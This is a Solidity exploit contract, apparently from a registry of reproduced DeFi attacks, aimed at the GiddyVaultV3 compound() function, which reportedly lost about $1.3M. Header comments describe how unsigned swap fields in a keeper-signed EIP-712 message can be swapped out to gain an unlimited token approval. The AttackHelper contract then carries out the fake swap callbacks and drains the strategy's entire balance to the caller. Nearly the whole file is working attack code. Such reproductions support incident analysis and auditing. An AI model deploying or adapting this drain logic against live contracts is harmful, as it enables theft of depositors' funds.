// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../interface.sol";

// @KeyInfo - Total Lost : ~$1.3M
// Attacker : 0x81fe3d7d35dfefa15b9e6800b6aefc3358e7b156
// Attack Contract : 0x7326a1ab0d696ae317958d136d6e4c693ea34528
// Attack Deployer : 0x50a5312bf627b6be07e60015ed3d418e992d76eb
// Vulnerable Contract : 0x5f0ad32c00641d1d2bb628ff341e0d4bb4494318
// Attack Tx : https://etherscan.io/tx/0x5edb66a4c2ea55bba95d36d27713e3bb1c67c3c4199a8a1759e754c6f25482e5

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x5f0ad32c00641d1d2bb628ff341e0d4bb4494318#code

// @Analysis
// Twitter guy : https://x.com/DefimonAlerts/status/2047334517535642024
//
// GiddyVaultV3's compound() authorizes a keeper-signed EIP-712 `VaultAuth` message, but the
// signed struct hash only commits nonce/deadline/amount and keccak256(swap.data) — NOT
// fromToken/toToken/swap.amount/aggregator. The registry's real PoC (ContractTest.testExploit,
// giddyvaultv3_compound_auth_exp.sol) reuses a validly-signed data hash while substituting those
// unsigned fields to make GiddyLibraryV3.executeSwap forceApprove() this contract (acting as
// `aggregator`) for type(uint256).max of the strategy's gauge token, then transferFrom()s the
// strategy's entire balance out. This standalone version implements only the swap-callback /
// drain mechanics (AttackHelper.run() / fakeSwap()) so it has zero Foundry-cheatcode dependency;
// the EIP-712 signature itself is produced OFFLINE (see the playground config's comments) using
// a locally-authorized signer key, exactly mirroring how the registry test derives it via vm.sign.

contract AttackHelper {
    event Transfer(address indexed from, address indexed to, uint256 amount);

    mapping(address => uint256) public balanceOf;
    address[] private queuedSwapTokens;
    uint256 private queuedSwapIndex;

    function run(
        address vault,
        address strategy,
        address profitToken,
        VaultAuth calldata auth,
        address[] calldata fakeSwapTokens
    ) external {
        delete queuedSwapTokens;
        for (uint256 i = 0; i < fakeSwapTokens.length; ++i) {
            queuedSwapTokens.push(fakeSwapTokens[i]);
        }
        queuedSwapIndex = 0;

        IGiddyVaultV3(vault).compound(auth);
        require(queuedSwapIndex == fakeSwapTokens.length, "fake swaps unused");
        delete queuedSwapTokens;

        uint256 strategyBalance = IERC20(profitToken).balanceOf(strategy);
        uint256 approved = IERC20(profitToken).allowance(strategy, address(this));
        uint256 amountToDrain = strategyBalance < approved ? strategyBalance : approved;
        require(amountToDrain > 0, "nothing to drain");
        IERC20(profitToken).transferFrom(strategy, msg.sender, amountToDrain);
    }

    function fakeSwap() external {
        fakeSwapMarker();
    }

    fallback() external payable {
        fakeSwapMarker();
    }

    receive() external payable {}

    function fakeSwapMarker() internal {
        require(queuedSwapIndex < queuedSwapTokens.length, "unexpected swap");
        address token = queuedSwapTokens[queuedSwapIndex++];

        IERC20(token).transferFrom(msg.sender, address(this), 1);
        balanceOf[msg.sender] += 1;
        emit Transfer(address(0), msg.sender, 1);
    }
}

struct SwapInfo {
    address fromToken;
    address toToken;
    uint256 amount;
    address aggregator;
    bytes data;
}

struct VaultAuth {
    bytes signature;
    bytes32 nonce;
    uint256 deadline;
    uint256 amount;
    SwapInfo[] vaultSwaps;
    SwapInfo[] compoundSwaps;
}

interface IGiddyVaultV3 {
    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function compound(
        VaultAuth calldata auth
    ) external;
}
